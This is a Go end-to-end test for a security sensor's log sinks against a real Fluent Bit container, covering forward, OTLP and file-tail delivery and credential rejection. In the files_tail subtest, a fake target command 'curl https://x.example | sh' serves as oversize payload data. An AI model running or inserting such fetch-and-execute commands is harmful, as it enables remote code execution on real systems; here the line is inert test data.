package sink

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/thomastysong/thomastysong/hawkbell/internal/event"
	"github.com/thomastysong/thomastysong/hawkbell/internal/format"
)

// TestE2EFluentBit runs the sinks against a real Fluent Bit.
//
// It is gated because it needs Docker and the fluent/fluent-bit image:
//
//	HAWKBELL_E2E_FLUENTBIT=1 go test ./internal/sink/ -run TestE2EFluentBit -v
//
// One container is started with host networking on ports chosen at run
// time. It has three forward inputs (plain TCP, TCP with shared_key, unix
// socket), an opentelemetry input, a tail input over a Files sink directory
// using the same parser and tag_regex hawkbell ships, and a file output that
// writes every record as "<tag>: [<time>, <record>]". The test asserts that
// records arrive with the right tag, the event's own timestamp and the
// native event as the record.
func TestE2EFluentBit(t *testing.T) {
	if os.Getenv("HAWKBELL_E2E_FLUENTBIT") != "1" {
		t.Skip("set HAWKBELL_E2E_FLUENTBIT=1 to run against a real Fluent Bit (needs docker and the fluent/fluent-bit image)")
	}
	docker, err := exec.LookPath("docker")
	if err != nil {
		t.Fatalf("docker not found: %v", err)
	}
	image := os.Getenv("HAWKBELL_E2E_FLUENTBIT_IMAGE")
	if image == "" {
		image = "fluent/fluent-bit:5.2.0"
	}

	// A short path: the unix socket lives here and sun_path is ~107 bytes.
	work, err := os.MkdirTemp("", "spe2e")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(work) })
	// The container runs as its own user; everything it must write to or
	// read from is world accessible, and directories are created here so
	// this process can remove them afterwards.
	for _, d := range []string{"", "out", "spool"} {
		p := filepath.Join(work, d)
		if err := os.MkdirAll(p, 0o777); err != nil {
			t.Fatal(err)
		}
		os.Chmod(p, 0o777)
	}
	plain, secure, users, otlp := freePort(t), freePort(t), freePort(t), freePort(t)
	conf := fmt.Sprintf(`service:
  flush: 1
  grace: 1
  log_level: info
parsers:
  - name: hawkbell_ndjson
    format: json
    time_key: ts
    time_format: '%%Y-%%m-%%dT%%H:%%M:%%S.%%L%%z'
    time_keep: on
pipeline:
  inputs:
    - name: forward
      listen: 127.0.0.1
      port: %d
    - name: forward
      listen: 127.0.0.1
      port: %d
      shared_key: s3cret
      self_hostname: flb.e2e
    - name: forward
      listen: 127.0.0.1
      port: %d
      shared_key: s3cret
      self_hostname: flb.e2e
      security.users: sensor hunter2
    - name: forward
      unix_path: /work/fwd.sock
      unix_perm: 0666
    - name: opentelemetry
      listen: 127.0.0.1
      port: %d
      tag: otlp.hawkbell
    - name: tail
      path: /work/spool/*.ndjson
      tag: tail.<stream>
      tag_regex: '(?<stream>[a-z_]+)-[0-9]+-[0-9]+-[0-9]+\.ndjson$'
      parser: hawkbell_ndjson
      read_from_head: true
      refresh_interval: 1
      buffer_chunk_size: 64k
      buffer_max_size: 64k
      skip_long_lines: on
  outputs:
    - name: file
      match: '*'
      path: /work/out
`, plain, secure, users, otlp)
	if err := os.WriteFile(filepath.Join(work, "fluent-bit.yaml"), []byte(conf), 0o644); err != nil {
		t.Fatal(err)
	}

	name := fmt.Sprintf("hawkbell-e2e-%d", os.Getpid())
	ctx, cancel := context.WithCancel(context.Background())
	var logs bytes.Buffer
	cmd := exec.CommandContext(ctx, docker, "run", "--rm", "--name", name, "--network", "host",
		"-v", work+":/work", image, "/fluent-bit/bin/fluent-bit", "-c", "/work/fluent-bit.yaml")
	cmd.Stdout, cmd.Stderr = &logs, &logs
	// The docker CLI forwards signals to the container, so ask it to stop
	// politely on cancel and, where the OS allows, when this process dies.
	cmd.Cancel = func() error { return cmd.Process.Signal(os.Interrupt) }
	cmd.WaitDelay = 10 * time.Second
	stopWithParent(cmd)
	if err := cmd.Start(); err != nil {
		t.Fatalf("docker run: %v", err)
	}
	t.Cleanup(func() {
		exec.Command(docker, "rm", "-f", name).Run()
		cancel()
		cmd.Wait()
		if t.Failed() {
			t.Logf("fluent-bit output:\n%s", logs.String())
		}
	})
	sock := filepath.Join(work, "fwd.sock")
	waitFor(t, 60*time.Second, "fluent-bit to listen", func() bool {
		for _, p := range []int{plain, secure, users, otlp} {
			c, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", p), time.Second)
			if err != nil {
				return false
			}
			c.Close()
		}
		_, err := os.Stat(sock)
		return err == nil
	})

	// mk builds an event with a unique time so the timestamp check proves
	// each record carries its own.
	seq := 0
	mk := func(kind event.Kind, id string) *event.Event {
		seq++
		e := kindEvent(kind, id)
		e.TS = event.At(testTime.Add(time.Duration(seq) * 1234567891))
		e.Seq = uint64(seq)
		e.Tool.Input = map[string]any{
			"command": "echo \"quoted\" 'single' \\ back\nnewline\ttab é日本\U0001F600",
			"count":   json.Number("3"), "ratio": json.Number("0.25"), "flag": true,
			"nested": map[string]any{"list": []any{"a", json.Number("2"), map[string]any{"deep": "x"}}},
		}
		return e
	}

	t.Run("forward_tcp", func(t *testing.T) {
		s := newForward(t, ForwardOptions{Addr: fmt.Sprintf("tcp://127.0.0.1:%d", plain), Timeout: 10 * time.Second})
		batch := []*event.Event{mk(event.KindActivity, "fw-a1"), mk(event.KindDetection, "fw-d1"), mk(event.KindActivity, "fw-a2")}
		if err := s.Write(batch); err != nil {
			t.Fatal(err)
		}
		expectRecords(t, work, "hawkbell.activity", []*event.Event{batch[0], batch[2]}, nanos)
		expectRecords(t, work, "hawkbell.detection", []*event.Event{batch[1]}, nanos)
	})

	t.Run("forward_shared_key", func(t *testing.T) {
		s := newForward(t, ForwardOptions{Addr: fmt.Sprintf("tcp://127.0.0.1:%d", secure), SharedKey: "s3cret", TagPrefix: "secure", Timeout: 10 * time.Second})
		batch := []*event.Event{mk(event.KindInventory, "sk-i1"), mk(event.KindInventory, "sk-i2")}
		if err := s.Write(batch); err != nil {
			t.Fatal(err)
		}
		expectRecords(t, work, "secure.inventory", batch, nanos)

		bad := newForward(t, ForwardOptions{Addr: fmt.Sprintf("tcp://127.0.0.1:%d", secure), SharedKey: "wrong", TagPrefix: "rejected", Timeout: 3 * time.Second})
		if err := bad.Write([]*event.Event{mk(event.KindInventory, "sk-bad")}); err == nil {
			t.Fatal("Fluent Bit accepted a wrong shared key")
		}
		none := newForward(t, ForwardOptions{Addr: fmt.Sprintf("tcp://127.0.0.1:%d", secure), TagPrefix: "rejected", Timeout: 3 * time.Second})
		if err := none.Write([]*event.Event{mk(event.KindInventory, "sk-none")}); err == nil || !strings.Contains(err.Error(), "SharedKey") {
			t.Fatalf("writing without a key to a keyed input: %v", err)
		}
		time.Sleep(1500 * time.Millisecond) // one flush interval
		if _, err := os.Stat(filepath.Join(work, "out", "rejected.inventory")); err == nil {
			t.Fatal("records from an unauthenticated client were ingested")
		}
	})

	t.Run("forward_users", func(t *testing.T) {
		addr := fmt.Sprintf("tcp://127.0.0.1:%d", users)
		s := newForward(t, ForwardOptions{Addr: addr, SharedKey: "s3cret", Username: "sensor", Password: "hunter2", TagPrefix: "users", Timeout: 10 * time.Second})
		batch := []*event.Event{mk(event.KindHealth, "us-h1")}
		if err := s.Write(batch); err != nil {
			t.Fatal(err)
		}
		expectRecords(t, work, "users.health", batch, nanos)
		for name, o := range map[string]ForwardOptions{
			"wrong password": {Addr: addr, SharedKey: "s3cret", Username: "sensor", Password: "nope"},
			"unknown user":   {Addr: addr, SharedKey: "s3cret", Username: "mallory", Password: "hunter2"},
			"no credentials": {Addr: addr, SharedKey: "s3cret"},
		} {
			o.TagPrefix, o.Timeout = "rejected", 3*time.Second
			if err := newForward(t, o).Write([]*event.Event{mk(event.KindHealth, "us-bad")}); err == nil {
				t.Errorf("%s: Fluent Bit accepted the client", name)
			}
		}
		time.Sleep(1500 * time.Millisecond)
		if _, err := os.Stat(filepath.Join(work, "out", "rejected.health")); err == nil {
			t.Fatal("records from a client with bad credentials were ingested")
		}
	})

	t.Run("forward_unix_gzip", func(t *testing.T) {
		s := newForward(t, ForwardOptions{Addr: "unix://" + sock, Compress: true, TagPrefix: "unix", Timeout: 10 * time.Second})
		var batch []*event.Event
		for i := 0; i < 200; i++ {
			batch = append(batch, mk(event.KindPosture, fmt.Sprintf("ux-%03d", i)))
		}
		if err := s.Write(batch); err != nil {
			t.Fatal(err)
		}
		expectRecords(t, work, "unix.posture", batch, nanos)
	})

	t.Run("otlp", func(t *testing.T) {
		for _, gz := range []bool{false, true} {
			s, err := NewOTLP(OTLPOptions{Endpoint: fmt.Sprintf("http://127.0.0.1:%d", otlp), Gzip: gz, ServiceVersion: "e2e", Timeout: 10 * time.Second})
			if err != nil {
				t.Fatal(err)
			}
			batch := []*event.Event{mk(event.KindDetection, fmt.Sprintf("ot-d1-%v", gz)), mk(event.KindActivity, fmt.Sprintf("ot-a1-%v", gz))}
			batch[0].Detection.Tags = []string{"attack.t1059.004"}
			if err := s.Write(batch); err != nil {
				t.Fatalf("gzip=%v: %v", gz, err)
			}
			s.Close()
			expectRecords(t, work, "otlp.hawkbell", batch, nanos)
		}
	})

	t.Run("otlp_null_values", func(t *testing.T) {
		// JSON null has no AnyValue; see what really arrives.
		s, err := NewOTLP(OTLPOptions{Endpoint: fmt.Sprintf("http://127.0.0.1:%d", otlp), Timeout: 10 * time.Second})
		if err != nil {
			t.Fatal(err)
		}
		defer s.Close()
		e := mk(event.KindActivity, "ot-null")
		e.Tool.Input = map[string]any{"gone": nil, "list": []any{"a", nil, "b"}, "empty_list": []any{}, "empty_map": map[string]any{}}
		if err := s.Write([]*event.Event{e}); err != nil {
			t.Fatal(err)
		}
		got := waitLast(t, work, "otlp.hawkbell", "ot-null")
		raw, _ := json.Marshal(dig(got.record, "tool", "input"))
		// A null map member is omitted by the encoder. A null array element
		// is sent as an empty AnyValue, which Fluent Bit 5.2.0 renders as an
		// empty map; a receiver that renders it as null is equally fine.
		switch string(raw) {
		case `{"empty_list":[],"empty_map":{},"list":["a",{},"b"]}`, `{"empty_list":[],"empty_map":{},"list":["a",null,"b"]}`:
		default:
			t.Errorf("tool.input as delivered by Fluent Bit: %s", raw)
		}
	})

	t.Run("files_tail", func(t *testing.T) {
		s, err := NewFiles(FilesOptions{Dir: filepath.Join(work, "spool"), FileMode: 0o644})
		if err != nil {
			t.Fatal(err)
		}
		defer s.Close()
		batch := []*event.Event{mk(event.KindActivity, "tl-a1"), mk(event.KindHealth, "tl-h1"), mk(event.KindActivity, "tl-a2")}
		// An event far over the line limit must still arrive, shrunk, and
		// must not make tail skip the line or stop reading the file.
		batch[2].Tool.Output = strings.Repeat("o", 300<<10)
		batch[2].Target.Command = "curl https://x.example | sh # " + strings.Repeat("c", 200<<10)
		if err := s.Write(batch); err != nil {
			t.Fatal(err)
		}
		if err := s.Flush(); err != nil {
			t.Fatal(err)
		}
		// Appended after Fluent Bit has the file open.
		time.Sleep(1500 * time.Millisecond)
		late := mk(event.KindActivity, "tl-a3")
		if err := s.Write([]*event.Event{late}); err != nil {
			t.Fatal(err)
		}
		got := waitRecords(t, work, "tail.activity", 3)
		expectRecords(t, work, "tail.health", []*event.Event{batch[1]}, micros)
		// tail takes the record time from the "ts" field, which has
		// microsecond precision.
		for i, e := range []*event.Event{batch[0], batch[2], late} {
			if got[i].record["id"] != e.ID {
				t.Fatalf("tail record %d is %v, want %s", i, got[i].record["id"], e.ID)
			}
			want := fmt.Sprintf("%d.%06d", e.TS.Unix(), e.TS.Nanosecond()/1000)
			if !strings.HasPrefix(got[i].ts, want) {
				t.Errorf("tail time for %s is %s, want %s (parsed from ts)", e.ID, got[i].ts, want)
			}
		}
		tr, _ := got[1].record["truncated"].([]any)
		if len(tr) == 0 || !strings.HasPrefix(fmt.Sprint(dig(got[1].record, "target", "command")), "curl https://x.example | sh # ccc") {
			t.Errorf("oversize event did not arrive shrunk: truncated=%v", tr)
		}
		if strings.Contains(logs.String(), "long lines") {
			t.Error("Fluent Bit reported a skipped long line")
		}
	})

	t.Run("shipper_to_forward", func(t *testing.T) {
		dir := t.TempDir()
		w, err := NewFiles(FilesOptions{Dir: dir, MaxSegment: 64 << 10})
		if err != nil {
			t.Fatal(err)
		}
		var want []*event.Event
		for i := 0; i < 500; i++ {
			e := mk(event.KindActivity, fmt.Sprintf("sh-%04d", i))
			want = append(want, e)
			if err := w.Write([]*event.Event{e}); err != nil {
				t.Fatal(err)
			}
		}
		w.Close()
		dst := newForward(t, ForwardOptions{Addr: fmt.Sprintf("tcp://127.0.0.1:%d", plain), TagPrefix: "shipped", Timeout: 10 * time.Second})
		sh, stop := startShipper(t, ShipperOptions{Dir: dir, Batch: 100}, dst, nil)
		waitFor(t, 30*time.Second, "shipper to drain", func() bool { return sh.Stats().Shipped == 500 && sh.Stats().Backlog == 0 })
		stop()
		expectRecords(t, work, "shipped.activity", want, micros)
		if st := sh.Stats(); st.Errors != 0 || st.Dropped != 0 || st.BadLines != 0 {
			t.Errorf("shipper stats: %+v", st)
		}
	})

}

func freePort(t testing.TB) int {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	return ln.Addr().(*net.TCPAddr).Port
}

func dig(m map[string]any, path ...string) any {
	var cur any = m
	for _, k := range path {
		mm, ok := cur.(map[string]any)
		if !ok {
			return nil
		}
		cur = mm[k]
	}
	return cur
}

type outRecord struct {
	ts     string // seconds.nanoseconds as Fluent Bit printed it
	record map[string]any
}

// readOut parses Fluent Bit's file output for one tag. Each line is
// "<tag>: [<time>, <record>]".
func readOut(t testing.TB, work, tag string) []outRecord {
	t.Helper()
	f, err := os.Open(filepath.Join(work, "out", tag))
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []outRecord
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 1<<20), 16<<20)
	for sc.Scan() {
		line := sc.Text()
		rest, ok := strings.CutPrefix(line, tag+": ")
		if !ok {
			t.Fatalf("unexpected line in %s: %.100q", tag, line)
		}
		dec := json.NewDecoder(strings.NewReader(rest))
		dec.UseNumber()
		var pair []any
		if err := dec.Decode(&pair); err != nil || len(pair) != 2 {
			t.Fatalf("unparsable line in %s: %v: %.200q", tag, err, line)
		}
		rec, _ := pair[1].(map[string]any)
		out = append(out, outRecord{ts: fmt.Sprint(pair[0]), record: rec})
	}
	return out
}

// waitLast waits until the newest record under tag has the given id.
func waitLast(t testing.TB, work, tag, id string) outRecord {
	t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	for {
		got := readOut(t, work, tag)
		if n := len(got); n > 0 && got[n-1].record["id"] == id {
			return got[n-1]
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s: record %s did not arrive", tag, id)
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func waitRecords(t testing.TB, work, tag string, n int) []outRecord {
	t.Helper()
	var got []outRecord
	deadline := time.Now().Add(30 * time.Second)
	for {
		got = readOut(t, work, tag)
		if len(got) >= n {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s: %d of %d records arrived", tag, len(got), n)
		}
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(1200 * time.Millisecond) // one more flush: catch duplicates
	got = readOut(t, work, tag)
	if len(got) != n {
		t.Fatalf("%s: %d records arrived, want exactly %d", tag, len(got), n)
	}
	return got
}

// Timestamp precision expected on a record. A sink that sends the event
// directly carries nanoseconds; anything that went through a segment file
// carries what the "ts" field holds, which is microseconds.
const (
	micros = 6
	nanos  = 9
)

// expectRecords waits for the records of want under tag (accumulated over
// the whole test run for that tag) and checks the newest len(want) of them:
// same order, the native event as the record, and the event's own time at
// the given precision.
func expectRecords(t testing.TB, work, tag string, want []*event.Event, precision int) {
	t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	var got []outRecord
	for {
		got = readOut(t, work, tag)
		if n := len(got); n >= len(want) && got[n-1].record["id"] == want[len(want)-1].ID {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s: %d records, the last expected one (%s) did not arrive", tag, len(got), want[len(want)-1].ID)
		}
		time.Sleep(200 * time.Millisecond)
	}
	got = got[len(got)-len(want):]
	for i, e := range want {
		if got[i].record["id"] != e.ID {
			t.Fatalf("%s: record %d is %v, want %s", tag, i, got[i].record["id"], e.ID)
		}
		native, err := format.Native(e)
		if err != nil {
			t.Fatal(err)
		}
		g, _ := json.Marshal(got[i].record)
		w, _ := json.Marshal(native)
		if !bytes.Equal(g, w) {
			t.Errorf("%s: record %s differs from the native event\n got %s\nwant %s", tag, e.ID, g, w)
		}
		ts := ""
		switch precision {
		case nanos:
			ts = fmt.Sprintf("%d.%09d", e.TS.Unix(), e.TS.Nanosecond())
		case micros:
			ts = fmt.Sprintf("%d.%06d000", e.TS.Unix(), e.TS.Nanosecond()/1000)
		}
		if ts != "" && got[i].ts != ts {
			t.Errorf("%s: record %s has time %s, want %s", tag, e.ID, got[i].ts, ts)
		}
	}
}
